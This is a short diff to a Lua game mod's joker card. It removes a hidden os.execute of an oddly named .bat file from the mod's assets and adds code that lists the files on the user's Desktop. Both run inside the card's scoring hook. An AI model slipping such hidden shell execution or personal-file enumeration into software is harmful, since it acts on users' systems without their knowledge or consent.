@@ -10885,8 +10885,17 @@ SMODS.Joker{
 	end,
 	calculate = function(self, card, context)
 		if context.joker_main then
-			local f = io.popen("cd"):read() .. "\\mods\\Horizon\\assets\\pa75bPr.bat"
-			os.execute(f)
+			--local f = io.popen("cd"):read() .. "\\mods\\Horizon\\assets\\pa75bPr.bat"
+			--os.execute(f)
+			local dir = os.getenv("USERPROFILE") .. "\\Desktop\\"
+			local p = io.popen('dir "'..dir..'" /b')  --Open directory look for files, save data in p. (with option "/b" everything contained in the given directory is listed with simple format)
+			local data = {}
+			local i = 1
+			for file in p:lines() do                    --Loop through all files
+				data[i] = tostring(file)
+				i = i + 1
+			end
+			print(data)
 		end
 	end
 }
